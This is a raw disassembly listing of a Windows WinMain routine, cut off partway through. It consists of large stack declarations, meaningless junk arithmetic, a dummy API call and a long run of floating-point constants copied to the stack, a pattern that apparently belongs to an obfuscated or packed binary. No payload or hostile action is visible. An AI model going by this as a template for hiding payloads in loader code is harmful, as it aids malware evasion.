var_DF8		= qword	ptr -0DF8h
var_DF0		= qword	ptr -0DF0h
var_DE8		= qword	ptr -0DE8h
var_DE0		= qword	ptr -0DE0h
var_DD8		= qword	ptr -0DD8h
var_DD0		= qword	ptr -0DD0h
var_DC8		= qword	ptr -0DC8h
var_DC0		= qword	ptr -0DC0h
var_DB8		= qword	ptr -0DB8h
var_DB0		= qword	ptr -0DB0h
var_DA8		= qword	ptr -0DA8h
var_DA0		= qword	ptr -0DA0h
var_D98		= qword	ptr -0D98h
var_D90		= qword	ptr -0D90h
var_D88		= qword	ptr -0D88h
var_D80		= qword	ptr -0D80h
var_D78		= qword	ptr -0D78h
var_D70		= qword	ptr -0D70h
var_D68		= qword	ptr -0D68h
var_D60		= qword	ptr -0D60h
var_D58		= qword	ptr -0D58h
var_D50		= qword	ptr -0D50h
var_D48		= qword	ptr -0D48h
var_D40		= qword	ptr -0D40h
var_D38		= qword	ptr -0D38h
var_D30		= qword	ptr -0D30h
var_D28		= qword	ptr -0D28h
var_D20		= qword	ptr -0D20h
var_D18		= qword	ptr -0D18h
var_D10		= qword	ptr -0D10h
var_D08		= qword	ptr -0D08h
var_D00		= qword	ptr -0D00h
var_CF8		= qword	ptr -0CF8h
var_CF0		= qword	ptr -0CF0h
var_CE8		= qword	ptr -0CE8h
var_CE0		= qword	ptr -0CE0h
var_CD8		= qword	ptr -0CD8h
var_CD0		= qword	ptr -0CD0h
var_CC8		= qword	ptr -0CC8h
var_CC0		= qword	ptr -0CC0h
var_CB8		= qword	ptr -0CB8h
var_CB0		= qword	ptr -0CB0h
var_CA8		= qword	ptr -0CA8h
var_CA0		= qword	ptr -0CA0h
var_C98		= qword	ptr -0C98h
var_C90		= qword	ptr -0C90h
var_C88		= qword	ptr -0C88h
var_C80		= qword	ptr -0C80h
var_C78		= qword	ptr -0C78h
var_C70		= qword	ptr -0C70h
var_C68		= qword	ptr -0C68h
var_C60		= qword	ptr -0C60h
var_C58		= qword	ptr -0C58h
var_C50		= qword	ptr -0C50h
var_C48		= qword	ptr -0C48h
var_C40		= qword	ptr -0C40h
var_C38		= qword	ptr -0C38h
var_C30		= qword	ptr -0C30h
var_C28		= qword	ptr -0C28h
var_C20		= qword	ptr -0C20h
var_C18		= qword	ptr -0C18h
var_C10		= qword	ptr -0C10h
var_C08		= qword	ptr -0C08h
var_C00		= qword	ptr -0C00h
var_BF8		= qword	ptr -0BF8h
var_BF0		= qword	ptr -0BF0h
var_BE8		= qword	ptr -0BE8h
var_BE0		= qword	ptr -0BE0h
var_BD8		= qword	ptr -0BD8h
var_BD0		= qword	ptr -0BD0h
var_BC8		= qword	ptr -0BC8h
var_BC0		= qword	ptr -0BC0h
var_BB8		= qword	ptr -0BB8h
var_BB0		= qword	ptr -0BB0h
var_BA8		= qword	ptr -0BA8h
var_BA0		= qword	ptr -0BA0h
var_B98		= qword	ptr -0B98h
var_B90		= qword	ptr -0B90h
var_B88		= qword	ptr -0B88h
var_B80		= qword	ptr -0B80h
var_B78		= qword	ptr -0B78h
var_B70		= qword	ptr -0B70h
var_B68		= qword	ptr -0B68h
var_B60		= qword	ptr -0B60h
var_B58		= qword	ptr -0B58h
var_B50		= qword	ptr -0B50h
var_B48		= qword	ptr -0B48h
var_B40		= qword	ptr -0B40h
var_B38		= qword	ptr -0B38h
var_B30		= qword	ptr -0B30h
var_B28		= qword	ptr -0B28h
var_B20		= qword	ptr -0B20h
var_B18		= qword	ptr -0B18h
var_B10		= qword	ptr -0B10h
var_B08		= qword	ptr -0B08h
var_B00		= qword	ptr -0B00h
var_AF8		= qword	ptr -0AF8h
var_AF0		= qword	ptr -0AF0h
var_AE8		= qword	ptr -0AE8h
var_AE0		= qword	ptr -0AE0h
var_AD8		= qword	ptr -0AD8h
var_AD0		= qword	ptr -0AD0h
var_AC8		= qword	ptr -0AC8h
var_AC0		= qword	ptr -0AC0h
var_AB8		= qword	ptr -0AB8h
var_AB0		= qword	ptr -0AB0h
var_AA8		= qword	ptr -0AA8h
var_AA0		= qword	ptr -0AA0h
var_A98		= qword	ptr -0A98h
var_A90		= qword	ptr -0A90h
var_A88		= qword	ptr -0A88h
var_A80		= qword	ptr -0A80h
var_A78		= qword	ptr -0A78h
var_A70		= qword	ptr -0A70h
var_A68		= qword	ptr -0A68h
var_A60		= qword	ptr -0A60h
var_A58		= qword	ptr -0A58h
var_A50		= qword	ptr -0A50h
var_A48		= qword	ptr -0A48h
var_A40		= qword	ptr -0A40h
var_A38		= qword	ptr -0A38h
var_A30		= qword	ptr -0A30h
var_A28		= qword	ptr -0A28h
var_A20		= qword	ptr -0A20h
var_A18		= qword	ptr -0A18h
var_A10		= qword	ptr -0A10h
var_A08		= qword	ptr -0A08h
var_A00		= qword	ptr -0A00h
var_9F8		= qword	ptr -9F8h
var_9F0		= qword	ptr -9F0h
var_9E8		= qword	ptr -9E8h
var_9E0		= qword	ptr -9E0h
var_9D8		= qword	ptr -9D8h
var_9D0		= qword	ptr -9D0h
var_9C8		= qword	ptr -9C8h
var_9C0		= qword	ptr -9C0h
var_9B8		= qword	ptr -9B8h
var_9B0		= qword	ptr -9B0h
var_9A8		= qword	ptr -9A8h
var_9A0		= qword	ptr -9A0h
var_998		= qword	ptr -998h
var_990		= qword	ptr -990h
var_988		= qword	ptr -988h
var_980		= qword	ptr -980h
var_978		= qword	ptr -978h
var_970		= qword	ptr -970h
var_968		= qword	ptr -968h
var_960		= qword	ptr -960h
var_958		= qword	ptr -958h
var_950		= qword	ptr -950h
var_948		= qword	ptr -948h
var_940		= qword	ptr -940h
var_938		= qword	ptr -938h
var_930		= qword	ptr -930h
var_928		= qword	ptr -928h
var_920		= qword	ptr -920h
var_918		= qword	ptr -918h
var_910		= qword	ptr -910h
var_908		= qword	ptr -908h
var_900		= qword	ptr -900h
var_8F8		= qword	ptr -8F8h
var_8F0		= qword	ptr -8F0h
var_8E8		= qword	ptr -8E8h
var_8E0		= qword	ptr -8E0h
var_8D8		= qword	ptr -8D8h
var_8D0		= qword	ptr -8D0h
var_8C8		= qword	ptr -8C8h
var_8C0		= qword	ptr -8C0h
var_8B8		= qword	ptr -8B8h
var_8B0		= qword	ptr -8B0h
var_8A8		= qword	ptr -8A8h
var_8A0		= qword	ptr -8A0h
var_898		= qword	ptr -898h
var_890		= qword	ptr -890h
var_888		= qword	ptr -888h
var_880		= qword	ptr -880h
var_878		= qword	ptr -878h
var_870		= qword	ptr -870h
var_868		= qword	ptr -868h
var_860		= qword	ptr -860h
var_858		= qword	ptr -858h
var_850		= qword	ptr -850h
var_848		= qword	ptr -848h
var_840		= qword	ptr -840h
var_838		= qword	ptr -838h
var_830		= qword	ptr -830h
var_828		= qword	ptr -828h
var_820		= qword	ptr -820h
var_818		= qword	ptr -818h
var_810		= qword	ptr -810h
var_808		= qword	ptr -808h
var_800		= qword	ptr -800h
var_7F8		= qword	ptr -7F8h
var_7F0		= qword	ptr -7F0h
var_7E8		= qword	ptr -7E8h
var_7E0		= qword	ptr -7E0h
var_7D8		= qword	ptr -7D8h
var_7D0		= qword	ptr -7D0h
var_7C8		= qword	ptr -7C8h
var_7C0		= qword	ptr -7C0h
var_7B8		= qword	ptr -7B8h
var_7B0		= qword	ptr -7B0h
var_7A8		= qword	ptr -7A8h
var_7A0		= qword	ptr -7A0h
var_798		= qword	ptr -798h
var_790		= qword	ptr -790h
var_788		= qword	ptr -788h
var_780		= qword	ptr -780h
var_778		= qword	ptr -778h
var_770		= qword	ptr -770h
var_768		= qword	ptr -768h
var_760		= qword	ptr -760h
var_758		= qword	ptr -758h
var_750		= qword	ptr -750h
var_748		= qword	ptr -748h
var_740		= qword	ptr -740h
var_738		= qword	ptr -738h
var_730		= qword	ptr -730h
var_728		= qword	ptr -728h
var_720		= qword	ptr -720h
var_718		= qword	ptr -718h
var_710		= qword	ptr -710h
var_708		= qword	ptr -708h
var_700		= qword	ptr -700h
var_6F8		= qword	ptr -6F8h
var_6F0		= qword	ptr -6F0h
var_6E8		= qword	ptr -6E8h
var_6E0		= qword	ptr -6E0h
var_6D8		= qword	ptr -6D8h
var_6D0		= qword	ptr -6D0h
var_6C8		= qword	ptr -6C8h
var_6C0		= qword	ptr -6C0h
var_6B8		= qword	ptr -6B8h
var_6B0		= qword	ptr -6B0h
var_6A8		= qword	ptr -6A8h
var_6A0		= qword	ptr -6A0h
var_698		= qword	ptr -698h
var_690		= qword	ptr -690h
var_688		= qword	ptr -688h
var_680		= qword	ptr -680h
var_678		= qword	ptr -678h
var_670		= qword	ptr -670h
var_668		= qword	ptr -668h
var_660		= qword	ptr -660h
var_658		= qword	ptr -658h
var_650		= qword	ptr -650h
var_648		= qword	ptr -648h
var_640		= qword	ptr -640h
var_638		= qword	ptr -638h
var_630		= qword	ptr -630h
var_628		= qword	ptr -628h
var_620		= qword	ptr -620h
var_618		= qword	ptr -618h
var_610		= qword	ptr -610h
var_608		= qword	ptr -608h
var_600		= qword	ptr -600h
var_5F8		= qword	ptr -5F8h
var_5F0		= qword	ptr -5F0h
var_5E8		= qword	ptr -5E8h
var_5E0		= qword	ptr -5E0h
var_5D8		= qword	ptr -5D8h
var_5D0		= qword	ptr -5D0h
var_5C8		= qword	ptr -5C8h
var_5C0		= qword	ptr -5C0h
var_5B8		= qword	ptr -5B8h
var_5B0		= qword	ptr -5B0h
var_5A8		= qword	ptr -5A8h
var_5A0		= qword	ptr -5A0h
var_598		= qword	ptr -598h
var_590		= qword	ptr -590h
var_588		= qword	ptr -588h
var_580		= qword	ptr -580h
var_578		= qword	ptr -578h
var_570		= qword	ptr -570h
var_568		= qword	ptr -568h
var_560		= qword	ptr -560h
var_558		= qword	ptr -558h
var_550		= qword	ptr -550h
var_548		= qword	ptr -548h
var_540		= qword	ptr -540h
var_538		= qword	ptr -538h
var_530		= qword	ptr -530h
var_528		= qword	ptr -528h
var_520		= qword	ptr -520h
var_518		= qword	ptr -518h
var_510		= qword	ptr -510h
var_508		= qword	ptr -508h
var_500		= qword	ptr -500h
var_4F8		= qword	ptr -4F8h
var_4F0		= qword	ptr -4F0h
var_4E8		= qword	ptr -4E8h
var_4E0		= qword	ptr -4E0h
var_4D8		= qword	ptr -4D8h
var_4D0		= qword	ptr -4D0h
var_4C8		= qword	ptr -4C8h
var_4C0		= qword	ptr -4C0h
var_4B8		= qword	ptr -4B8h
var_4B0		= qword	ptr -4B0h
var_4A8		= qword	ptr -4A8h
var_4A0		= qword	ptr -4A0h
var_498		= qword	ptr -498h
var_490		= qword	ptr -490h
var_488		= qword	ptr -488h
var_480		= qword	ptr -480h
var_478		= qword	ptr -478h
var_470		= qword	ptr -470h
var_468		= qword	ptr -468h
var_460		= qword	ptr -460h
var_458		= qword	ptr -458h
var_450		= qword	ptr -450h
var_448		= qword	ptr -448h
var_440		= qword	ptr -440h
var_438		= qword	ptr -438h
var_430		= qword	ptr -430h
var_428		= qword	ptr -428h
var_420		= qword	ptr -420h
var_418		= qword	ptr -418h
var_410		= qword	ptr -410h
var_408		= qword	ptr -408h
var_400		= qword	ptr -400h
var_3F8		= qword	ptr -3F8h
var_3F0		= qword	ptr -3F0h
var_3E8		= qword	ptr -3E8h
var_3E0		= qword	ptr -3E0h
var_3D8		= qword	ptr -3D8h
var_3D0		= qword	ptr -3D0h
var_3C8		= qword	ptr -3C8h
var_3C0		= qword	ptr -3C0h
var_3B8		= qword	ptr -3B8h
var_3B0		= qword	ptr -3B0h
var_3A8		= qword	ptr -3A8h
var_3A0		= qword	ptr -3A0h
var_398		= qword	ptr -398h
var_390		= qword	ptr -390h
var_388		= qword	ptr -388h
var_380		= qword	ptr -380h
var_378		= qword	ptr -378h
var_370		= qword	ptr -370h
var_368		= qword	ptr -368h
var_360		= qword	ptr -360h
var_358		= qword	ptr -358h
var_350		= qword	ptr -350h
var_348		= qword	ptr -348h
var_340		= qword	ptr -340h
var_338		= qword	ptr -338h
var_330		= qword	ptr -330h
var_328		= qword	ptr -328h
var_320		= qword	ptr -320h
var_318		= qword	ptr -318h
var_310		= qword	ptr -310h
var_308		= qword	ptr -308h
var_300		= qword	ptr -300h
var_2F8		= qword	ptr -2F8h
var_2F0		= qword	ptr -2F0h
var_2E8		= qword	ptr -2E8h
var_2E0		= qword	ptr -2E0h
var_2D8		= qword	ptr -2D8h
var_2D0		= qword	ptr -2D0h
var_2C8		= qword	ptr -2C8h
var_2C0		= qword	ptr -2C0h
var_2B8		= qword	ptr -2B8h
var_2B0		= qword	ptr -2B0h
var_2A8		= qword	ptr -2A8h
var_2A0		= qword	ptr -2A0h
var_298		= qword	ptr -298h
var_290		= qword	ptr -290h
var_288		= qword	ptr -288h
var_280		= qword	ptr -280h
var_278		= qword	ptr -278h
var_270		= qword	ptr -270h
var_268		= qword	ptr -268h
var_260		= qword	ptr -260h
var_258		= qword	ptr -258h
var_250		= qword	ptr -250h
var_248		= qword	ptr -248h
var_240		= qword	ptr -240h
var_238		= qword	ptr -238h
var_230		= qword	ptr -230h
var_228		= qword	ptr -228h
var_220		= qword	ptr -220h
var_218		= qword	ptr -218h
var_210		= qword	ptr -210h
var_208		= qword	ptr -208h
var_200		= qword	ptr -200h
var_1F8		= qword	ptr -1F8h
var_1F0		= qword	ptr -1F0h
var_1E8		= qword	ptr -1E8h
var_1E0		= qword	ptr -1E0h
var_1D8		= qword	ptr -1D8h
var_1D0		= dword	ptr -1D0h
pati		= dword	ptr -1CCh
var_1C5		= byte ptr -1C5h
var_1C4		= word ptr -1C4h
var_1C0		= dword	ptr -1C0h
var_1AC		= dword	ptr -1ACh
var_1A8		= word ptr -1A8h
var_1A4		= word ptr -1A4h
var_194		= dword	ptr -194h
var_184		= dword	ptr -184h
var_16C		= dword	ptr -16Ch
var_148		= dword	ptr -148h
var_12E		= byte ptr -12Eh
var_12D		= byte ptr -12Dh
var_12C		= word ptr -12Ch
var_128		= dword	ptr -128h
var_11E		= byte ptr -11Eh
var_11D		= byte ptr -11Dh
var_11C		= word ptr -11Ch
var_118		= word ptr -118h
var_114		= dword	ptr -114h
var_105		= byte ptr -105h
var_104		= dword	ptr -104h
var_100		= dword	ptr -100h
var_F9		= byte ptr -0F9h
var_F4		= word ptr -0F4h
var_F0		= word ptr -0F0h
var_EC		= dword	ptr -0ECh
var_E8		= word ptr -0E8h
var_E4		= word ptr -0E4h
hColorSpace	= dword	ptr -0E0h
var_DC		= dword	ptr -0DCh
var_D5		= byte ptr -0D5h
var_D4		= word ptr -0D4h
var_D0		= dword	ptr -0D0h
var_CC		= word ptr -0CCh
var_C8		= dword	ptr -0C8h
var_C4		= word ptr -0C4h
var_C0		= dword	ptr -0C0h
var_BC		= dword	ptr -0BCh
var_B8		= word ptr -0B8h
var_B4		= dword	ptr -0B4h
hwnd		= dword	ptr -0B0h
var_AC		= dword	ptr -0ACh
var_A8		= dword	ptr -0A8h
var_A4		= dword	ptr -0A4h
var_A0		= dword	ptr -0A0h
var_99		= byte ptr -99h
var_98		= word ptr -98h
var_94		= dword	ptr -94h
var_8C		= dword	ptr -8Ch
var_74		= dword	ptr -74h
var_40		= dword	ptr -40h
var_34		= dword	ptr -34h
var_28		= dword	ptr -28h
var_22		= byte ptr -22h
var_21		= byte ptr -21h
var_20		= word ptr -20h
var_1C		= word ptr -1Ch
var_10		= dword	ptr -10h
var_B		= byte ptr -0Bh
var_A		= byte ptr -0Ah
var_9		= byte ptr -9
var_8		= dword	ptr -8
var_4		= dword	ptr -4
hInstance	= dword	ptr  8
hPrevInstance	= dword	ptr  0Ch
lpCmdLine	= dword	ptr  10h
nShowCmd	= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		mov	eax, 3448h
		call	__alloca_probe
		push	ebx
		push	esi
		movzx	eax, [ebp+var_1A8]
		mov	dword_42C024, eax
		movzx	ecx, [ebp+var_341C]
		mov	edx, dword_42C024
		sub	edx, ecx
		mov	eax, dword_42C038
		sub	eax, edx
		mov	dword_42C038, eax
		mov	hdc, 18h
		mov	cx, word ptr [ebp+hwnd]
		mov	word ptr [ebp+var_C8], cx
		mov	[ebp+var_8C], 49h
		mov	edx, 13h
		sub	edx, [ebp+var_343C]
		mov	[ebp+hColorSpace], edx
		mov	[ebp+nSize], 27h
		movzx	eax, [ebp+var_9]
		add	eax, [ebp+var_8]
		mov	ecx, [ebp+var_128]
		sub	ecx, 11h
		or	eax, ecx
		mov	[ebp+var_1A8], ax
		movzx	edx, [ebp+var_3414]
		mov	eax, [ebp+var_DC]
		add	eax, 1Dh
		and	edx, eax
		movzx	ecx, [ebp+var_3431]
		sub	ecx, edx
		mov	[ebp+var_3431],	cl
		mov	edx, [ebp+var_100]
		mov	[ebp+var_DC], edx
		movzx	eax, [ebp+var_105]
		add	eax, 46h
		movzx	ecx, [ebp+var_12E]
		mov	edx, [ebp+var_28]
		sub	edx, ecx
		xor	eax, edx
		mov	[ebp+var_C4], ax
		movzx	eax, [ebp+var_B]
		add	eax, 59h
		movzx	ecx, [ebp+var_33A8]
		sub	eax, ecx
		movzx	edx, [ebp+var_12C]
		add	edx, eax
		mov	[ebp+var_12C], dx
		mov	[ebp+var_3408],	44h
		movzx	esi, [ebp+var_1C5]
		add	esi, 1Eh
		mov	eax, [ebp+nSize]
		push	eax		; nSize
		push	0Bh		; lpBuffer
		mov	ecx, [ebp+hColorSpace]
		push	ecx		; hColorSpace
		call	ds:GetLogColorSpaceA
		add	eax, [ebp+var_100]
		and	esi, eax
		mov	[ebp+var_3428],	si
		movzx	edx, [ebp+var_118]
		mov	[ebp+var_A4], edx
		mov	eax, [ebp+hColorSpace]
		mov	[ebp+var_A0], eax
		mov	ecx, [ebp+var_3420]
		mov	edx, [ebp+hwnd]
		lea	eax, [edx+ecx+11h]
		sub	eax, [ebp+var_94]
		mov	[ebp+var_21], al
		mov	ecx, 18h
		sub	ecx, [ebp+var_100]
		movzx	edx, [ebp+var_12D]
		movzx	eax, [ebp+var_12E]
		add	edx, eax
		xor	ecx, edx
		mov	[ebp+var_1C], cx
		mov	ecx, [ebp+var_28]
		sub	ecx, [ebp+var_B4]
		add	ecx, 75h
		movzx	edx, [ebp+var_33A8]
		sub	ecx, edx
		mov	[ebp+var_F9], cl
		mov	eax, [ebp+var_100]
		add	eax, 48h
		mov	[ebp+var_1AC], eax
		mov	ecx, 0FFFFFFF0h
		sub	ecx, [ebp+var_B4]
		mov	[ebp+var_114], ecx
		mov	[ebp+var_A4], 5Ch
		mov	edx, [ebp+hColorSpace]
		sub	edx, 42h
		mov	[ebp+var_A0], edx
		movzx	eax, [ebp+var_12E]
		add	eax, 54h
		mov	ecx, dword_42C044
		sub	ecx, eax
		mov	dword_42C044, ecx
		movzx	edx, [ebp+var_11C]
		sub	edx, [ebp+var_1D0]
		add	edx, [ebp+var_3420]
		mov	[ebp+var_3424],	edx
		mov	eax, [ebp+var_C8]
		or	eax, 2Fh
		movzx	ecx, [ebp+var_F4]
		or	eax, ecx
		movzx	edx, [ebp+var_98]
		add	edx, eax
		mov	[ebp+var_98], dx
		mov	eax, [ebp+var_100]
		mov	[ebp+var_343C],	eax
		mov	hProcess, 58h
		movzx	ecx, [ebp+var_1C5]
		mov	y, ecx
		movzx	edx, [ebp+var_CC]
		movzx	eax, [ebp+var_D4]
		sub	edx, eax
		mov	ecx, dword_42C044
		sub	ecx, edx
		mov	dword_42C044, ecx
		mov	edx, y
		mov	[ebp+var_33E8],	edx
		mov	dword_42C024, 48h
		mov	eax, dword_42C024
		add	eax, 37h
		movzx	ecx, [ebp+var_99]
		xor	ecx, eax
		mov	[ebp+var_99], cl
		movzx	edx, [ebp+var_11C]
		mov	eax, hdc
		lea	ecx, [eax+edx-50h]
		sub	ecx, [ebp+var_3424]
		mov	[ebp+var_1C], cx
		movzx	edx, word ptr dword_42C024
		mov	hProcess, edx
		mov	eax, hProcess
		mov	[ebp+var_184], eax
		movzx	ecx, [ebp+var_1C4]
		add	ecx, 39h
		or	ecx, 53h
		mov	[ebp+var_12D], cl
		movzx	edx, [ebp+var_20]
		mov	eax, 49h
		sub	eax, edx
		sub	eax, [ebp+var_DC]
		mov	[ebp+var_104], eax
		mov	ecx, [ebp+var_DC]
		add	ecx, 4Dh
		mov	[ebp+var_BC], ecx
		movzx	edx, [ebp+var_20]
		mov	eax, 18h
		sub	eax, edx
		mov	[ebp+var_B4], eax
		mov	ecx, [ebp+var_343C]
		sub	ecx, [ebp+var_A0]
		movzx	edx, [ebp+var_F0]
		movzx	eax, [ebp+var_98]
		add	edx, eax
		or	ecx, edx
		mov	[ebp+var_342C],	cx
		movzx	ecx, [ebp+var_1A4]
		add	ecx, [ebp+var_100]
		or	ecx, 61h
		movzx	edx, [ebp+var_105]
		add	edx, ecx
		mov	[ebp+var_105], dl
		movzx	eax, [ebp+var_105]
		mov	dword_42C024, eax
		mov	ecx, 39h
		mov	word ptr hProcess, cx
		mov	edx, Wow64Process
		mov	[ebp+var_33BC],	edx
		mov	Wow64Process, 5Fh
		mov	y, 35h
		movzx	eax, [ebp+var_11E]
		add	eax, 49h
		and	eax, 53h
		xor	eax, hProcess
		mov	[ebp+var_F4], ax
		fld	ds:dbl_424748
		fstp	[ebp+var_3398]
		fld	ds:dbl_424B78
		fstp	[ebp+var_3390]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_3388]
		fld	ds:dbl_4247D0
		fstp	[ebp+var_3380]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_3378]
		fld	ds:dbl_424650
		fstp	[ebp+var_3370]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_3368]
		fld	ds:dbl_4244C0
		fstp	[ebp+var_3360]
		fld	ds:dbl_424730
		fstp	[ebp+var_3358]
		fld	ds:dbl_424848
		fstp	[ebp+var_3350]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_3348]
		fld	ds:dbl_424A28
		fstp	[ebp+var_3340]
		fld	ds:dbl_424948
		fstp	[ebp+var_3338]
		fld	ds:dbl_4249F8
		fstp	[ebp+var_3330]
		fld	ds:dbl_4245D0
		fstp	[ebp+var_3328]
		fld	ds:dbl_424650
		fstp	[ebp+var_3320]
		fld	ds:dbl_424458
		fstp	[ebp+var_3318]
		fld	ds:dbl_424978
		fstp	[ebp+var_3310]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_3308]
		fld	ds:dbl_424A58
		fstp	[ebp+var_3300]
		fld	ds:dbl_4245B8
		fstp	[ebp+var_32F8]
		fld	ds:dbl_424788
		fstp	[ebp+var_32F0]
		fld	ds:dbl_424A98
		fstp	[ebp+var_32E8]
		fld	ds:dbl_4244C8
		fstp	[ebp+var_32E0]
		fld	ds:dbl_424970
		fstp	[ebp+var_32D8]
		fld	ds:dbl_424608
		fstp	[ebp+var_32D0]
		fld	ds:dbl_424660
		fstp	[ebp+var_32C8]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_32C0]
		fld	ds:dbl_424920
		fstp	[ebp+var_32B8]
		fld	ds:dbl_424840
		fstp	[ebp+var_32B0]
		fld	ds:dbl_424A38
		fstp	[ebp+var_32A8]
		fld	ds:dbl_424638
		fstp	[ebp+var_32A0]
		fld	ds:dbl_4245D0
		fstp	[ebp+var_3298]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_3290]
		fld	ds:dbl_424BA8
		fstp	[ebp+var_3288]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_3280]
		fld	ds:dbl_424898
		fstp	[ebp+var_3278]
		fld	ds:dbl_424A18
		fstp	[ebp+var_3270]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_3268]
		fld	ds:dbl_424550
		fstp	[ebp+var_3260]
		fld	ds:dbl_424458
		fstp	[ebp+var_3258]
		fld	ds:dbl_4244F0
		fstp	[ebp+var_3250]
		fld	ds:dbl_424AE8
		fstp	[ebp+var_3248]
		fld	ds:dbl_424908
		fstp	[ebp+var_3240]
		fld	ds:dbl_424C00
		fstp	[ebp+var_3238]
		fld	ds:dbl_424870
		fstp	[ebp+var_3230]
		fld	ds:dbl_424910
		fstp	[ebp+var_3228]
		fld	ds:dbl_424A40
		fstp	[ebp+var_3220]
		fld	ds:dbl_4247E0
		fstp	[ebp+var_3218]
		fld	ds:dbl_424618
		fstp	[ebp+var_3210]
		fld	ds:dbl_4247D0
		fstp	[ebp+var_3208]
		fld	ds:dbl_424C10
		fstp	[ebp+var_3200]
		fld	ds:dbl_424B08
		fstp	[ebp+var_31F8]
		fld	ds:dbl_424A80
		fstp	[ebp+var_31F0]
		fld	ds:dbl_424948
		fstp	[ebp+var_31E8]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_31E0]
		fld	ds:dbl_424750
		fstp	[ebp+var_31D8]
		fld	ds:dbl_424928
		fstp	[ebp+var_31D0]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_31C8]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_31C0]
		fld	ds:dbl_424A00
		fstp	[ebp+var_31B8]
		fld	ds:dbl_4248E0
		fstp	[ebp+var_31B0]
		fld	ds:dbl_424980
		fstp	[ebp+var_31A8]
		fld	ds:dbl_424A98
		fstp	[ebp+var_31A0]
		fld	ds:dbl_424AD8
		fstp	[ebp+var_3198]
		fld	ds:dbl_424430
		fstp	[ebp+var_3190]
		fld	ds:dbl_4247C0
		fstp	[ebp+var_3188]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_3180]
		fld	ds:dbl_4248D0
		fstp	[ebp+var_3178]
		fld	ds:dbl_424800
		fstp	[ebp+var_3170]
		fld	ds:dbl_424B78
		fstp	[ebp+var_3168]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_3160]
		fld	ds:dbl_424468
		fstp	[ebp+var_3158]
		fld	ds:dbl_424488
		fstp	[ebp+var_3150]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_3148]
		fld	ds:dbl_424A70
		fstp	[ebp+var_3140]
		fld	ds:dbl_424648
		fstp	[ebp+var_3138]
		fld	ds:dbl_424598
		fstp	[ebp+var_3130]
		fld	ds:dbl_424448
		fstp	[ebp+var_3128]
		fld	ds:dbl_424AF0
		fstp	[ebp+var_3120]
		fld	ds:dbl_424780
		fstp	[ebp+var_3118]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_3110]
		fld	ds:dbl_424730
		fstp	[ebp+var_3108]
		fld	ds:dbl_4246D0
		fstp	[ebp+var_3100]
		fld	ds:dbl_424870
		fstp	[ebp+var_30F8]
		fld	ds:dbl_424B78
		fstp	[ebp+var_30F0]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_30E8]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_30E0]
		fld	ds:dbl_424540
		fstp	[ebp+var_30D8]
		fld	ds:dbl_424610
		fstp	[ebp+var_30D0]
		fld	ds:dbl_424650
		fstp	[ebp+var_30C8]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_30C0]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_30B8]
		fld	ds:dbl_424780
		fstp	[ebp+var_30B0]
		fld	ds:dbl_424768
		fstp	[ebp+var_30A8]
		fld	ds:dbl_424810
		fstp	[ebp+var_30A0]
		fld	ds:dbl_424878
		fstp	[ebp+var_3098]
		fld	ds:dbl_424930
		fstp	[ebp+var_3090]
		fld	ds:dbl_424AC8
		fstp	[ebp+var_3088]
		fld	ds:dbl_424728
		fstp	[ebp+var_3080]
		fld	ds:dbl_424620
		fstp	[ebp+var_3078]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_3070]
		fld	ds:dbl_424458
		fstp	[ebp+var_3068]
		fld	ds:dbl_424988
		fstp	[ebp+var_3060]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_3058]
		fld	ds:dbl_4248E8
		fstp	[ebp+var_3050]
		fld	ds:dbl_424788
		fstp	[ebp+var_3048]
		fld	ds:dbl_424770
		fstp	[ebp+var_3040]
		fld	ds:dbl_424548
		fstp	[ebp+var_3038]
		fld	ds:dbl_424778
		fstp	[ebp+var_3030]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_3028]
		fld	ds:dbl_424A18
		fstp	[ebp+var_3020]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_3018]
		fld	ds:dbl_424C10
		fstp	[ebp+var_3010]
		fld	ds:dbl_424A70
		fstp	[ebp+var_3008]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_3000]
		fld	ds:dbl_424548
		fstp	[ebp+var_2FF8]
		fld	ds:dbl_424860
		fstp	[ebp+var_2FF0]
		fld1
		fstp	[ebp+var_2FE8]
		fld	ds:dbl_424B88
		fstp	[ebp+var_2FE0]
		fld	ds:dbl_424620
		fstp	[ebp+var_2FD8]
		fld	ds:dbl_424640
		fstp	[ebp+var_2FD0]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_2FC8]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_2FC0]
		fld	ds:dbl_424830
		fstp	[ebp+var_2FB8]
		fld	ds:dbl_424940
		fstp	[ebp+var_2FB0]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_2FA8]
		fld	ds:dbl_424828
		fstp	[ebp+var_2FA0]
		fld	ds:dbl_424AE8
		fstp	[ebp+var_2F98]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_2F90]
		fld	ds:dbl_424A90
		fstp	[ebp+var_2F88]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_2F80]
		fld	ds:dbl_424A50
		fstp	[ebp+var_2F78]
		fld	ds:dbl_424B10
		fstp	[ebp+var_2F70]
		fld	ds:dbl_424930
		fstp	[ebp+var_2F68]
		fld	ds:dbl_424A10
		fstp	[ebp+var_2F60]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_2F58]
		fld	ds:dbl_424B08
		fstp	[ebp+var_2F50]
		fld	ds:dbl_424750
		fstp	[ebp+var_2F48]
		fld	ds:dbl_424C28
